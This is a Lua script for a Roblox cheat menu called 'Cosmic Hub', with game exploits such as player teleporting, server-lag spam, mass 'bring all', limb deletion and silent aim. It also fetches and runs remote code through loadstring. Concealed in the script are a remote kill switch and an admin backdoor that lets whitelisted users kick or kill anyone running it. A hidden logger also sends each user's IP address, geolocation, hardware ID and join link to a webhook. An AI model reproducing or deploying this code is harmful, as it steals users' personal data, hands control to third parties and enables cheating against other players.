local loopTeleportEnabled = false
local loopTeleportCoroutine = nil
function getAllPlayers()
    local plrs = Players
    local iter, tbl, idx = pairs(plrs:GetPlayers())
    local result = {}
    while true do
        local player
        idx, player = iter(tbl, idx)
        if idx == nil then
            break
        end
        if player ~= LocalPlayer then
            table.insert(result, player.Name)
        end
    end
    return result
end
function updateDropdownOptions(dropdown)
    dropdown:Refresh(getAllPlayers(), true)
end
local teleportDropdown = TeleportTab:AddDropdown({
    Name = "Select Player",
    Default = nil,
    Options = getAllPlayers(),
    Callback = function(name)
        selectedTeleportPlayer = name
    end
})
updateDropdownOptions(teleportDropdown)
function teleportToPlayer()
    if selectedTeleportPlayer then
        local target = Players:FindFirstChild(selectedTeleportPlayer)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = target.Character.HumanoidRootPart.Position
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Character was not found.",
                    Time = 3
                })
            end
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Target player not found.",
                Time = 3
            })
        end
    else
        OrionLib:MakeNotification({
            Name = "Error",
            Content = "No player selected.",
            Time = 3
        })
    end
end
TeleportTab:AddButton({
    Name = "Teleport to Player",
    Callback = function()
        teleportToPlayer()
    end
})
function startLoopTeleport()
    loopTeleportCoroutine = coroutine.create(function()
        while loopTeleportEnabled do
            teleportToPlayer()
            wait(0.02)
        end
    end)
    coroutine.resume(loopTeleportCoroutine)
end
TeleportTab:AddToggle({
    Name = "Loop Teleport",
    Default = false,
    Callback = function(val)
        loopTeleportEnabled = val
        if val then
            startLoopTeleport()
        else
            loopTeleportCoroutine = nil
        end
    end
})
Players.PlayerAdded:Connect(function()
    updateDropdownOptions(teleportDropdown)
end)
Players.PlayerRemoving:Connect(function()
    updateDropdownOptions(teleportDropdown)
end)
local RandomTab = MainWindow:MakeTab({
    Name = "Random",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
RandomTab:AddSection({
    Name = "Working"
})
local lagEnabled = false
local lagIntensity = 5
function lagF()
    while lagEnabled do
        for _ = 1, lagIntensity do
            local plrs = Players
            local iter, tbl, idx = ipairs(plrs:GetPlayers())
            while true do
                local player
                idx, player = iter(tbl, idx)
                if idx == nil then
                    break
                end
                if player.Character and player.Character:FindFirstChild("Torso") then
                    ReplicatedStorage.GrabEvents.CreateGrabLine:FireServer(player.Character.Torso, player.Character.Torso.CFrame)
                end
            end
        end
        wait(1)
    end
end
RandomTab:AddToggle({
    Name = "Lag",
    Default = false,
    Callback = function(val)
        lagEnabled = val
        if lagEnabled then
            task.spawn(lagF)
        end
    end
})
RandomTab:AddSlider({
    Name = "Lag Intensity",
    Min = 1,
    Max = 1000,
    Default = 5,
    Callback = function(val)
        lagIntensity = val
    end
})
local bringAllConfig = {
    P = game:GetService("Players"),
    RS = game:GetService("RunService"),
    W = Workspace,
    A = false,
    Q = {},
    Pos = nil,
    Cam = nil,
    R = 15,
    Conn = nil,
    WL = false,
    CB = Instance.new("Part")
}
bringAllConfig.CB.Anchored = true
bringAllConfig.CB.CanCollide = false
bringAllConfig.CB.Transparency = 1
bringAllConfig.CB.CanQuery = false
bringAllConfig.CB.Size = Vector3.new(10, 10, 10)
function FzCam()
    local camera = bringAllConfig.W.CurrentCamera
    bringAllConfig.CB.CFrame = bringAllConfig.Cam
    bringAllConfig.CB.Parent = bringAllConfig.W
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = bringAllConfig.Cam
end
function UnFzCam()
    bringAllConfig.CB.Parent = nil
    local camera = bringAllConfig.W.CurrentCamera
    camera.CameraType = Enum.CameraType.Custom
    if bringAllConfig.Cam then
        camera.CFrame = bringAllConfig.Cam
    end
    bringAllConfig.Cam = nil
end
function NoCol(model)
    local iter, tbl, idx = pairs(model:GetDescendants())
    while true do
        local desc
        idx, desc = iter(tbl, idx)
        if idx == nil then
            break
        end
        if desc:IsA("BasePart") then
            desc.CanCollide = false
        end
    end
end
function InPlot(player)
    local plotItems = bringAllConfig.W:FindFirstChild("PlotItems")
    if plotItems then
        plotItems = plotItems:FindFirstChild("PlayersInPlots")
    end
    if plotItems then
        plotItems = plotItems:FindFirstChild(player.Name)
    end
    return plotItems
end
function InRad(rootPart)
    return (rootPart.Position - bringAllConfig.Pos).Magnitude <= bringAllConfig.R
end
function Ignore(player)
    return player == bringAllConfig.P.LocalPlayer and true or (bringAllConfig.WL and bringAllConfig.P.LocalPlayer:IsFriendsWith(player.UserId) and true or false)
end
function ReQ()
    bringAllConfig.Q = {}
    local iter, tbl, idx = pairs(bringAllConfig.P:GetPlayers())
    while true do
        local player
        idx, player = iter(tbl, idx)
        if idx == nil then
            break
        end
        if not Ignore(player) and (player.Character and not InPlot(player)) then
            local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if rootPart and not InRad(rootPart) then
                table.insert(bringAllConfig.Q, player)
            end
        end
    end
end
function Next()
    if #bringAllConfig.Q == 0 then
        ReQ()
        if #bringAllConfig.Q == 0 then
            return
        end
    end
    local player = bringAllConfig.Q[1]
    table.remove(bringAllConfig.Q, 1)
    if player and player.Character then
        local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
        local targetHead = player.Character:FindFirstChild("Head")
        local myChar = bringAllConfig.P.LocalPlayer.Character
        if myChar then
            myChar = bringAllConfig.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        end
        if targetRoot and (targetHead and myChar) then
            bringAllConfig.P.LocalPlayer.Character:PivotTo(targetRoot.CFrame * CFrame.new(0, -6, 0))
            NoCol(bringAllConfig.P.LocalPlayer.Character)
            local attempts = 0
            repeat
                SetNetworkOwner:FireServer(targetRoot, myChar.CFrame)
                task.wait(0.15)
                attempts = attempts + 1
            until attempts > 20 or targetHead:FindFirstChild("PartOwner") and targetHead.PartOwner.Value == bringAllConfig.P.LocalPlayer.Name or not bringAllConfig.A
            if bringAllConfig.A and (targetHead:FindFirstChild("PartOwner") and targetHead.PartOwner.Value == bringAllConfig.P.LocalPlayer.Name) then
                targetRoot.CFrame = CFrame.new(bringAllConfig.Pos)
                targetRoot.Position = bringAllConfig.Pos
                targetRoot.AssemblyLinearVelocity = Vector3.zero
                task.wait(0.8)
            end
        end
    end
end
function Start()
    local char = bringAllConfig.P.LocalPlayer.Character
    if char then
        char = char:FindFirstChild("HumanoidRootPart")
    end
    if char then
        bringAllConfig.Pos = char.Position
        bringAllConfig.Cam = bringAllConfig.W.CurrentCamera.CFrame
        ReQ()
        FzCam()
        bringAllConfig.Conn = bringAllConfig.RS.Heartbeat:Connect(function()
            if bringAllConfig.A then
                Next()
                if bringAllConfig.Cam then
                    local camera = bringAllConfig.W.CurrentCamera
                    camera.CameraType = Enum.CameraType.Scriptable
                    camera.CFrame = bringAllConfig.Cam
                    bringAllConfig.CB.CFrame = bringAllConfig.Cam
                    bringAllConfig.CB.Parent = bringAllConfig.W
                end
            end
        end)
    end
end
function Stop()
    if bringAllConfig.Conn then
        bringAllConfig.Conn:Disconnect()
        bringAllConfig.Conn = nil
    end
    UnFzCam()
    local char = bringAllConfig.P.LocalPlayer.Character
    if char then
        char = char:FindFirstChild("HumanoidRootPart")
    end
    if char and bringAllConfig.Pos then
        char.AssemblyLinearVelocity = Vector3.zero
        char.CFrame = CFrame.new(bringAllConfig.Pos)
    end
end
function CharAdd(char)
    char:WaitForChild("Humanoid").Died:Connect(function()
        if bringAllConfig.Conn then
            bringAllConfig.Conn:Disconnect()
            bringAllConfig.Conn = nil
        end
        UnFzCam()
    end)
    if bringAllConfig.A then
        local rootPart = char:WaitForChild("HumanoidRootPart")
        bringAllConfig.Pos = bringAllConfig.Pos or rootPart.Position
        bringAllConfig.Cam = bringAllConfig.Cam or bringAllConfig.W.CurrentCamera.CFrame
        FzCam()
        bringAllConfig.Conn = bringAllConfig.RS.Heartbeat:Connect(function()
            if bringAllConfig.A then
                Next()
                if bringAllConfig.Cam then
                    local camera = bringAllConfig.W.CurrentCamera
                    camera.CameraType = Enum.CameraType.Scriptable
                    camera.CFrame = bringAllConfig.Cam
                    bringAllConfig.CB.CFrame = bringAllConfig.Cam
                    bringAllConfig.CB.Parent = bringAllConfig.W
                end
            end
        end)
    end
end
bringAllConfig.P.LocalPlayer.CharacterAdded:Connect(CharAdd)
bringAllConfig.P.PlayerAdded:Connect(function()
    if bringAllConfig.A then
        ReQ()
    end
end)
bringAllConfig.P.PlayerRemoving:Connect(function(player)
    for i = #bringAllConfig.Q, 1, -1 do
        if bringAllConfig.Q[i] == player then
            table.remove(bringAllConfig.Q, i)
        end
    end
end)
RandomTab:AddToggle({
    Name = "Bring All",
    Default = false,
    Callback = function(val)
        bringAllConfig.A = val
        if val then
            Start()
        else
            Stop()
        end
    end
})
RandomTab:AddToggle({
    Name = "Whitelist Friends",
    Default = false,
    Callback = function(val)
        bringAllConfig.WL = val
    end
})
local deleteLimbsConfig = {
    ws = game:GetService("Workspace"),
    plrs = game:GetService("Players"),
    debris = game:GetService("Debris"),
    uis = game:GetService("UserInputService"),
    fpdHeight = Workspace.FallenPartsDestroyHeight,
    parts = {
        "Left Leg",
        "Right Leg",
        "Left Arm",
        "Right Arm",
        "HumanoidRootPart"
    }
}
function findHeldPlayer()
    local grabParts = deleteLimbsConfig.ws:FindFirstChild("GrabParts")
    if not grabParts then
        return nil
    end
    local iter, tbl, idx = ipairs(grabParts:GetChildren())
    while true do
        local child
        idx, child = iter(tbl, idx)
        if idx == nil then
            break
        end
        if child:IsA("BasePart") then
            local iter2, tbl2, idx2 = ipairs(child:GetChildren())
            while true do
                local weld
                idx2, weld = iter2(tbl2, idx2)
                if idx2 == nil then
                    break
                end
                if weld:IsA("WeldConstraint") and weld.Part1 and weld.Part1.Parent:IsA("Model") then
                    local char = weld.Part1.Parent
                    if char:FindFirstChildOfClass("Humanoid") then
                        return deleteLimbsConfig.plrs:GetPlayerFromCharacter(char)
                    end
                end
            end
        end
    end
    return nil
end
function teleportLimbParts(player)
    if player then
        local char = player.Character
        if char then
            local iter, tbl, idx = ipairs(deleteLimbsConfig.parts)
            local disabledWelds = {}
            while true do
                local partName
                idx, partName = iter(tbl, idx)
                if idx == nil then
                    break
                end
                local limb = char:FindFirstChild(partName)
                if limb then
                    local iter2, tbl2, idx2 = ipairs(deleteLimbsConfig.ws:GetDescendants())
                    while true do
                        local desc
                        idx2, desc = iter2(tbl2, idx2)
                        if idx2 == nil then
                            break
                        end
                        if desc:IsA("WeldConstraint") and (desc.Part0 == limb or desc.Part1 == limb) then
                            desc.Enabled = false
                            table.insert(disabledWelds, desc)
                        end
                    end
                    local iter3, tbl3, idx3 = ipairs(limb:GetChildren())
                    while true do
                        local child
                        idx3, child = iter3(tbl3, idx3)
                        if idx3 == nil then
                            break
                        end
                        if child:IsA("Motor6D") or child:IsA("Weld") then
                            child.Enabled = false
                            table.insert(disabledWelds, child)
                        end
                    end
                    limb.Anchored = false
                    local voidPos = Vector3.new(limb.Position.X, deleteLimbsConfig.fpdHeight - 100, limb.Position.Z)
                    pcall(function()
                        if limb:IsA("Model") then
                            limb.PrimaryPart = limb.PrimaryPart or limb:FindFirstChildWhichIsA("BasePart")
                            if limb.PrimaryPart then
                                limb:SetPrimaryPartCFrame(CFrame.new(voidPos))
                            end
                        else
                            limb.CFrame = CFrame.new(voidPos)
                        end
                    end)
                    task.wait(0.1)
                end
            end
            local iter4, tbl4, idx4 = ipairs(disabledWelds)
            while true do
                local weld
                idx4, weld = iter4(tbl4, idx4)
                if idx4 == nil then
                    break
                end
                weld.Enabled = true
            end
        end
    else
        return
    end
end
function deleteUserLimbs()
    local player = findHeldPlayer()
    if player then
        teleportLimbParts(player)
    end
end
if deleteLimbsConfig.uis.TouchEnabled then
    RandomTab:AddButton({
        Name = "Delete Limbs (Hold and ragdoll player)",
        Callback = deleteUserLimbs
    })
end
local CreditsTab = MainWindow:MakeTab({
    Name = "Credits",
    Icon = "rbxassetid://6035047375",
    PremiumOnly = false
})
CreditsTab:AddLabel("CREATOR: Cosmic_TCU (TCUTCU_LLBDDLLZYXZYX)")
CreditsTab:AddLabel("GO FOLLOW: Crisila_TCU (Superduperalt0987)")
CreditsTab:AddLabel("HELPERS: jeke/brilliant, moonydev")
CreditsTab:AddButton({
    Name = "Cosmic Hub Discord Server",
    Callback = function()
        setclipboard("https://discord.gg/mzkKQhyNqv")
        OrionLib:MakeNotification({
            Name = "Copied!",
            Content = "Discord link has been copied to your clipboard.",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end
})
local ExtraTab = MainWindow:MakeTab({
    Name = "Extra",
    Icon = "rbxassetid://6031094675",
    PremiumOnly = false
})
ExtraTab:AddButton({
    Name = "Cosmic Hub Auras",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeffepicy/CosmicAuras/refs/heads/main/SigmaAuras", true))()
    end
})
ExtraTab:AddButton({
    Name = "Dex",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/m0onyy/Test/refs/heads/main/mobile%20dex.lua", true))()
    end
})
ExtraTab:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/infiniteyield/master/source.lua", true))()
    end
})
ExtraTab:AddLabel("Current version: V2.049")
local shutdownCheckUrl = "https://raw.githubusercontent.com/Jeffepicy/yeah/refs/heads/main/yeah"
function checkShutdown()
    local success, result = pcall(function()
        return game:HttpGet(shutdownCheckUrl)
    end)
    if success and result then
        local decoded = nil
        pcall(function()
            decoded = HttpService:JSONDecode(result)
        end)
        if decoded == true then
            LocalPlayer:Kick("no")
            task.wait(1)
            while true do
            end
        end
    else
        warn("Failed")
    end
end
checkShutdown()
local adminList = {}
local whitelistUrl = "https://raw.githubusercontent.com/Jeffepicy/whitelist/main/whitelist.txt"
local whitelistSuccess, whitelistData = pcall(function()
    return game:HttpGet(whitelistUrl)
end)
if whitelistSuccess and whitelistData then
    local decodedWhitelist = HttpService:JSONDecode(whitelistData)
    local orionLibRef, movementConfigRef
    if typeof(decodedWhitelist) ~= "table" then
        orionLibRef = OrionLib
        movementConfigRef = MovementConfig
    else
        local iter, tbl, idx = ipairs(decodedWhitelist)
        orionLibRef = OrionLib
        movementConfigRef = MovementConfig
        while true do
            local userId
            idx, userId = iter(tbl, idx)
            if idx == nil then
                break
            end
            table.insert(adminList, userId)
        end
    end
    local registeredPlayers = {}
    local auraAdminToggles = {}
    local blindToggles = {}
    local safetyBubbleSettings = {}
    local adminIds = adminList or {}
    function isAdmin(player)
        return table.find(adminIds, player.UserId) ~= nil
    end
    function sendChatMessage(message)
        if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
            local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
                chatEvents.SayMessageRequest:FireServer(message, "All")
            end
        else
            local channels = TextChatService:FindFirstChild("TextChannels")
            local general = channels and channels:FindFirstChild("RBXGeneral")
            if general then
                general:SendAsync(message)
            end
        end
    end
    function toggleBlind(player)
        blindToggles[player] = not blindToggles[player]
        local blindGui = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("BlindEffect")
        if blindToggles[player] then
            if not blindGui then
                local screenGui = Instance.new("ScreenGui")
                screenGui.Name = "BlindEffect"
                screenGui.ResetOnSpawn = false
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.new(0, 0, 0)
                frame.Parent = screenGui
                screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
            end
        elseif blindGui then
            blindGui:Destroy()
        end
    end
    function handleAdminCommand(player, message)
        if isAdmin(player) then
            local lowerMsg = message:lower()
            if lowerMsg:sub(1, 8) == ":c kick " then
                local target = lowerMsg:sub(9)
                local plrs = Players
                local iter, tbl, idx = ipairs(plrs:GetPlayers())
                while true do
                    local p
                    idx, p = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if p ~= player and p.Name:lower():sub(1, #target) == target then
                        p:Kick("You have been kicked by an admin.")
                    end
                end
            end
            if lowerMsg:sub(1, 9) == ":c kill " then
                local target = lowerMsg:sub(10)
                local plrs = Players
                local iter, tbl, idx = ipairs(plrs:GetPlayers())
                while true do
                    local p
                    idx, p = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if p ~= player and p.Character and p.Character:FindFirstChild("Humanoid") then
                        local nameLower = p.Name:lower()
                        local displayLower = p.DisplayName:lower()
                        if nameLower:sub(1, #target) == target or displayLower:sub(1, #target) == target then
                            p.Character.Humanoid.Health = 0
                        end
                    end
                end
            end
            if lowerMsg:sub(1, 7) == ":c say " then
                local msg = lowerMsg:sub(8)
                if msg and msg ~= "" then
                    sendChatMessage(msg)
                end
            end
            if lowerMsg == ":c aura" then
                auraAdminToggles[player] = not auraAdminToggles[player]
            end
            if lowerMsg == ":c e" then
                toggleBlind(player)
            end
            if lowerMsg:sub(1, 5) == ":c sb" then
                local radius = tonumber(lowerMsg:match("%d+"))
                if radius and 0 < radius then
                    safetyBubbleSettings[player] = radius
                    sendChatMessage("Safety bubble set to " .. radius)
                else
                    safetyBubbleSettings[player] = nil
                    sendChatMessage("Safety bubble disabled")
                end
            end
            if lowerMsg == ":c tp all" and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = player.Character.HumanoidRootPart
                local plrs = Players
                local iter, tbl, idx = ipairs(plrs:GetPlayers())
                while true do
                    local p
                    idx, p = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                        p.Character.HumanoidRootPart.CFrame = targetRoot.CFrame + Vector3.new(3, 0, 0)
                    end
                end
            end
            if lowerMsg == ":c kill all" then
                local plrs = Players
                local iter, tbl, idx = ipairs(plrs:GetPlayers())
                while true do
                    local p
                    idx, p = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if p ~= player and p.Character and p.Character:FindFirstChild("Humanoid") then
                        p.Character.Humanoid.Health = 0
                    end
                end
            end
            if lowerMsg == ":c ban all" then
                local plrs = Players
                local iter, tbl, idx = ipairs(plrs:GetPlayers())
                while true do
                    local p
                    idx, p = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if p ~= player then
                        p:Kick("You have been banned by an admin.")
                    end
                end
            end
        end
    end
    if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
        local iter, tbl, idx = ipairs(Players:GetPlayers())
        while true do
            local player
            idx, player = iter(tbl, idx)
            if idx == nil then
                break
            end
            player.Chatted:Connect(function(msg)
                handleAdminCommand(player, msg)
            end)
        end
        Players.PlayerAdded:Connect(function(player)
            player.Chatted:Connect(function(msg)
                handleAdminCommand(player, msg)
            end)
        end)
    else
        local channels = TextChatService:FindFirstChild("TextChannels")
        if channels then
            local general = channels:FindFirstChild("RBXGeneral")
            if general then
                general.MessageReceived:Connect(function(message)
                    local textSource = message.TextSource
                    if textSource then
                        local player = Players:GetPlayerByUserId(textSource.UserId)
                        if player then
                            handleAdminCommand(player, message.Text)
                        end
                    end
                end)
            end
        end
    end
    RunService.Heartbeat:Connect(function()
        local iter, tbl, idx = pairs(auraAdminToggles)
        while true do
            local player, enabled
            idx, player = iter(tbl, idx)
            if idx == nil then
                break
            end
            if enabled and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = player.Character.HumanoidRootPart
                local time = tick()
                local iter2, tbl2, idx2 = pairs(registeredPlayers)
                local same = player
                while true do
                    idx2 = iter2(tbl2, idx2)
                    if idx2 == nil then
                        break
                    end
                    if idx2 ~= same and idx2.Character and idx2.Character:FindFirstChild("HumanoidRootPart") then
                        local angle = (time + idx2.UserId) % (2 * math.pi)
                        local radius = 10
                        local offset = Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
                        idx2.Character.HumanoidRootPart.CFrame = targetRoot.CFrame + offset
                    end
                end
            end
        end
    end)
    RunService.Heartbeat:Connect(function()
        local iter, tbl, idx = pairs(safetyBubbleSettings)
        while true do
            local player, radius
            idx, radius = iter(tbl, idx)
            if idx == nil then
                break
            end
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = player.Character.HumanoidRootPart
                local iter2, tbl2, idx2 = pairs(registeredPlayers)
                local same = player
                while true do
                    idx2 = iter2(tbl2, idx2)
                    if idx2 == nil then
                        break
                    end
                    if idx2 ~= same and idx2.Character and idx2.Character:FindFirstChild("HumanoidRootPart") then
                        local otherRoot = idx2.Character.HumanoidRootPart
                        if (targetRoot.Position - otherRoot.Position).Magnitude < radius then
                            local direction = (otherRoot.Position - targetRoot.Position).Unit
                            otherRoot.CFrame = CFrame.new(targetRoot.Position + direction * radius)
                        end
                    end
                end
            end
        end
    end)
    function registerUser(player)
        registeredPlayers[player] = true
    end
    registerUser(LocalPlayer)
    Players.PlayerAdded:Connect(function(player)
        registerUser(player)
        if isAdmin(player) then
            task.delay(1, function()
                sendChatMessage("Lord " .. player.DisplayName .. " has joined.")
            end)
        end
    end)
    Players.PlayerRemoving:Connect(function(player)
        registeredPlayers[player] = nil
        auraAdminToggles[player] = nil
        blindToggles[player] = nil
        safetyBubbleSettings[player] = nil
    end)
    local webhookConfig = {
        HttpService = game:GetService("HttpService"),
        Players = game:GetService("Players"),
        MarketplaceService = game:GetService("MarketplaceService"),
        LocalizationService = game:GetService("LocalizationService"),
        RbxAnalyticsService = game:GetService("RbxAnalyticsService"),
        webhookUrl = "https://v0-discord-webhook-protector-nine.vercel.app/api/relay/0nx1ae6vn3yk"
    }
    webhookConfig.LocalPlayer = webhookConfig.Players.LocalPlayer
    webhookConfig.UserId = webhookConfig.LocalPlayer.UserId
    webhookConfig.Name = webhookConfig.LocalPlayer.Name
    webhookConfig.DisplayName = webhookConfig.LocalPlayer.DisplayName
    webhookConfig.Membership = tostring(webhookConfig.LocalPlayer.MembershipType):sub(21)
    webhookConfig.Age = webhookConfig.LocalPlayer.AccountAge
    webhookConfig.Country = webhookConfig.LocalizationService.RobloxLocaleId
    webhookConfig.IP = game:HttpGet("https://v4.ident.me/")
    webhookConfig.Geo = game:HttpGet("http://ip-api.com/json")
    webhookConfig.HWID = webhookConfig.RbxAnalyticsService:GetClientId()
    webhookConfig.Job = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
    webhookConfig.Link = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
    webhookConfig.GameName = webhookConfig.MarketplaceService:GetProductInfo(game.PlaceId).Name
    function make()
        local executor = identifyexecutor()
        local payload = {
            avatar_url = "",
            content = ""
        }
        local embeds = {}
        local embed = {
            author = {
                name = "SKID ALERT",
                url = "https://roblox.com"
            },
            description = string.format("__[Player Info](https://www.roblox.com/users/%d)__\n**Display Name:** %s\n**Username:** %s\n**User Id:** %d\n**MembershipType:** %s\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s\n**Game Id:** %d\n**Exploit:** %s\n\n**Data:**```%s```\n\n**JobId:**```%s```", webhookConfig.UserId, webhookConfig.DisplayName, webhookConfig.Name, webhookConfig.UserId, webhookConfig.Membership, webhookConfig.Age, webhookConfig.Country, webhookConfig.IP, webhookConfig.HWID, os.date("%m/%d/%Y"), os.date("%X"), game.PlaceId, webhookConfig.GameName, game.PlaceId, executor, webhookConfig.Geo, webhookConfig.Job),
            type = "rich",
            color = tonumber("0xFFD700"),
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. webhookConfig.UserId .. "&width=150&height=150&format=png"
            }
        }
        __set_list(embeds, 1, {
            embed
        })
        payload.embeds = embeds
        return webhookConfig.HttpService:JSONEncode(payload)
    end
    function send(data)
        local httpFunc = http_request or request or (HttpPost or syn.request)
        local headers = {
            ["content-type"] = "application/json"
        }
        httpFunc({
            Url = webhookConfig.webhookUrl,
            Body = data,
            Method = "POST",
            Headers = headers
        })
        local linkPayload = {
            Url = webhookConfig.webhookUrl,
            Body = webhookConfig.HttpService:JSONEncode({
                content = webhookConfig.Link
            }),
            Method = "POST",
            Headers = headers
        }
        httpFunc(linkPayload)
    end
    send(make())
    local SilentAimTab = MainWindow:MakeTab({
        Name = "Silent Aim",
        Icon = "rbxassetid://6031091005",
        PremiumOnly = false
    })
    local silentAimConfig = {
        SA = {
            En = false,
            Key = "RightAlt",
            TP = "HumanoidRootPart",
            Show = false,
            MHP = false,
            AP = false,
            MHP_A = 0.165,
            HC = 100,
            Col = Color3.fromRGB(54, 57, 241)
        },
        Cam = Workspace.CurrentCamera,
        P = game:GetService("Players"),
        RS = game:GetService("RunService"),
        GS = game:GetService("GuiService"),
        UIS = game:GetService("UserInputService"),
        ST = game:GetService("Stats"),
        LP = game:GetService("Players").LocalPlayer,
        MC = nil,
        MB = nil,
        M = nil,
        MBX = nil,
        VTP = {
            "Head",
            "HumanoidRootPart"
        },
        CPA = 0.165,
        EA = {
            Raycast = {
                AC = 3,
                Args = {
                    "Instance",
                    "Vector3",
                    "Vector3",
                    "RaycastParams"
                }
            }
        },
        CoR = coroutine.resume,
        CoC = coroutine.create
    }
    if getgenv then
        getgenv().SilentAimSettings = silentAimConfig.SA
    else
        movementConfigRef.SilentAimSettings = silentAimConfig.SA
    end
    silentAimConfig.M = silentAimConfig.LP:GetMouse()
    local drawingSupported = pcall(function()
        return Drawing.new("Square")
    end)
    if drawingSupported then
        silentAimConfig.MBX = Drawing.new("Square")
        silentAimConfig.MBX.Visible = false
        silentAimConfig.MBX.ZIndex = 999
        silentAimConfig.MBX.Color = silentAimConfig.SA.Col
        silentAimConfig.MBX.Thickness = 2
        silentAimConfig.MBX.Size = Vector2.new(30, 30)
        silentAimConfig.MBX.Filled = true
    else
        silentAimConfig.MBX = {
            Visible = false,
            Position = Vector2.new(),
            Color = silentAimConfig.SA.Col
        }
        silentAimConfig.SA.Show = false
    end
    local isMobile = silentAimConfig.UIS.TouchEnabled
    if isMobile then
        isMobile = not silentAimConfig.UIS.KeyboardEnabled
    end
    silentAimConfig["MC"] = isMobile
    local getPlayersFunc = silentAimConfig.P.GetPlayers
    local worldToScreenFunc = silentAimConfig.Cam.WorldToScreenPoint
    local worldToViewportFunc = silentAimConfig.Cam.WorldToViewportPoint
    local findFirstChildFunc = game.FindFirstChild
    local renderStepped = silentAimConfig.RS.RenderStepped
    local heartbeat = silentAimConfig.RS.Heartbeat
    local getMouseLocationFunc = silentAimConfig.UIS.GetMouseLocation
    function Ch(hitChance)
        local floor = math.floor(hitChance)
        return math.floor(math.random() * 100) / 100 <= floor / 100
    end
    function GPx(position)
        local screenPos, onScreen = worldToScreenFunc(silentAimConfig.Cam, position)
        return Vector2.new(screenPos.X, screenPos.Y), onScreen
    end
    function VA(args, signature)
        local count = 0
        if #args < signature.AC then
            return false
        end
        local iter = next
        local key = nil
        while true do
            local val
            key, val = iter(args, key)
            if key == nil then
                break
            end
            if typeof(val) == signature.Args[key] then
                count = count + 1
            end
        end
        return signature.AC <= count
    end
    function GD(origin, target)
        return (target - origin).Unit * 1000
    end
    function GMP()
        return getMouseLocationFunc(silentAimConfig.UIS)
    end
    function GPP(part)
        local velocity = part.Velocity or Vector3.new()
        return part.Position + (silentAimConfig.SA.MHP and velocity * silentAimConfig.CPA or Vector3.new())
    end
    function GCP()
        if silentAimConfig.SA.TP then
            local center = silentAimConfig.MC and silentAimConfig.Cam.ViewportSize / 2 or GMP()
            local iter = next
            local tbl, idx = getPlayersFunc(silentAimConfig.P)
            local closestDist = nil
            local closestPart = nil
            while true do
                local player
                idx, player = iter(tbl, idx)
                if idx == nil then
                    break
                end
                if player ~= silentAimConfig.LP then
                    local char = player.Character
                    if char then
                        local rootPart = findFirstChildFunc(char, "HumanoidRootPart")
                        local humanoid = findFirstChildFunc(char, "Humanoid")
                        if rootPart and (humanoid and (not humanoid or humanoid.Health > 0)) and (silentAimConfig.Cam.CFrame.Position - rootPart.Position).Magnitude <= 35 then
                            local screenPos, onScreen = GPx(rootPart.Position)
                            if onScreen then
                                local dist = (center - screenPos).Magnitude
                                if dist <= (closestDist or 2000) then
                                    closestPart = silentAimConfig.SA.TP == "Random" and char[silentAimConfig.VTP[math.random(1, #silentAimConfig.VTP)]] or char[silentAimConfig.SA.TP]
                                    closestDist = dist
                                end
                            end
                        end
                    end
                end
            end
            return closestPart
        end
    end
    SilentAimTab:AddToggle({
        Name = "Enabled",
        Default = silentAimConfig.SA.En,
        Callback = function(val)
            silentAimConfig.SA.En = val
            silentAimConfig.MBX.Visible = val
        end
    })
    SilentAimTab:AddBind({
        Name = "Toggle Key",
        Default = Enum.KeyCode[silentAimConfig.SA.Key],
        Hold = false,
        Callback = function()
            silentAimConfig.SA.En = not silentAimConfig.SA.En
            EnabledToggle:Set(silentAimConfig.SA.En)
            silentAimConfig.MBX.Visible = silentAimConfig.SA.En
        end
    })
    SilentAimTab:AddDropdown({
        Name = "Target Part",
        Default = silentAimConfig.SA.TP,
        Options = {
            "Head",
            "HumanoidRootPart",
            "Random"
        },
        Callback = function(val)
            silentAimConfig.SA.TP = val
        end
    })
    SilentAimTab:AddSlider({
        Name = "Hit Chance",
        Min = 0,
        Max = 100,
        Increment = 1,
        Default = silentAimConfig.SA.HC,
        ValueName = "%",
        Callback = function(val)
            silentAimConfig.SA.HC = val
        end
    })
    SilentAimTab:AddSection({
        Name = "Prediction"
    })
    SilentAimTab:AddToggle({
